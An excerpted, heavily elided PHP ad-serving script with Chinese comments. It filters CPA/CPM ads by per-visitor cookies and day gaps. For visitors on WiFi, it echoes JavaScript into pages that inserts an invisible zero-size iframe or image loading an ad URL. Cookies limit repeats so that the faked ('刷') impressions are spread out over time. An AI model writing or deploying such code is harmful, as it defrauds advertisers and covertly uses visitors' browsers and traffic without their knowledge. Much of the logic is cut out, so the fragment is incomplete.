...
$ads_cpa = [];
$ads_cpm = [];
$ads_default = [];  //初始广告组,正常情况=ads_cpm,如果CPM广告为空,则=ads_cpa


//第一道=============使用服务端cookie,过滤UV上刷过的广告,同一个UV上本身就控制不重复刷的.
foreach($nowdic as $v){
	$ad_cookie = $_COOKIE['pgbg_'.$userip_num.$v] ?: 0;  
	if(!$ad_cookie){
		...
		*/
		...
		foreach ($arr as $v) {
			...
			if($tmparr){
			  ...
			  if($gapday==''||$gapday==0){$gapday=1;} //    PVweight=0的广告,当天也不能重复刷同个UV,所以也过滤掉
		...
		if($un_ads_ids!=''){	//过滤当天不可刷的adsid,通过上面的排除字串过滤间隔天数未到			
            $ads_cpm_new=[];
			$ads_cpa_new=[];
...
if(!empty($nowdic)){
	...
	if($tz_flag||$ads[$curAdid]['pv_weight']==0){
		...
		//在所有刷之前加一道3小时的cookie,主要是为了凌晨3小时不会间隔太短的反复刷. 通过Wscokie函数setcookie
		$un_ads_ids = $un_ads_ids.','.$curAdid.'t'.date('Ymd');  
	    if($curAdid == 1120){
	    	if($isWifi){
				setcookie('pgbg_'.$userip_num.$curAdid,1,strtotime('23:59:59'));
	        	echo 'var a,i,h;""==WckgetCookie("h3out'.$userip_num.$ads[$curAdid]['id'].'")&&""==WckgetCookie("ispgs'.$userip_num.$ads[$curAdid]['id'].date('Ymd').'")&&(a=document.createElement("iframe"),a.src="',$gotourl,'",a.width="0",a.height="0",a.style="display:none;",h=document.getElementsByTagName("html")[0],h.appendChild(a),WcksetCookie("ispgs'.$userip_num.$ads[$curAdid]['id'].date('Ymd').'",3),Wscokie("h3out'.$userip_num.$ads[$curAdid]['id'].'",3),WcksetCookie("'.$userip_num.'bg","'.$un_ads_ids.'"));';
	        }
	    }else{
	    	if($isWifi){
	    		if(1==2 && ($curAdid == 952 || $curAdid == 1203 || $curAdid == 1271)){
				    ...
				    curl_close ($ch);
					setcookie('pgbg_'.$userip_num.$curAdid,1,strtotime('23:59:59'));
					echo 'WcksetCookie("ispgs'.$userip_num.$ads[$curAdid]['id'].date('Ymd').'",3);Wscokie("h3out'.$userip_num.$ads[$curAdid]['id'].'",3);WcksetCookie("'.$userip_num.'bg","'.$un_ads_ids.'");';

	    		}else{
					setcookie('pgbg_'.$userip_num.$curAdid,1,strtotime('23:59:59'));
	    			echo 'var a,i,h;""==WckgetCookie("h3out'.$userip_num.$ads[$curAdid]['id'].'")&&""==WckgetCookie("ispgs'.$userip_num.$ads[$curAdid]['id'].date('Ymd').'")&&(a=document.createElement("img"),a.src="',$gotourl,'",a.width="0",a.height="0",a.style="display:none;",h=document.getElementsByTagName("html")[0],h.appendChild(a),WcksetCookie("ispgs'.$userip_num.$ads[$curAdid]['id'].date('Ymd').'",3),Wscokie("h3out'.$userip_num.$ads[$curAdid]['id'].'",3),WcksetCookie("'.$userip_num.'bg","'.$un_ads_ids.'"));';
	    		}
